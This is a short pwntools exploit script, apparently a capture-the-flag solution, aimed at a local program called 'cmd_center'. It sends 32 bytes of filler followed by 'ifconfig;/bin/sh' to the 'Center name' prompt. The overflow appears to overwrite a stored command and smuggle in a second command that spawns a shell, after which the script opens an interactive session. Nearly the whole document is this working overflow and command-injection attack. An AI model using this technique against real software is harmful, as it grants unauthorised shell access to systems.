from pwn import *

p = process("./cmd_center")

p.sendafter("Center name: ", "0123456789abcdef0123456789abcdefifconfig;/bin/sh")
p.interactive()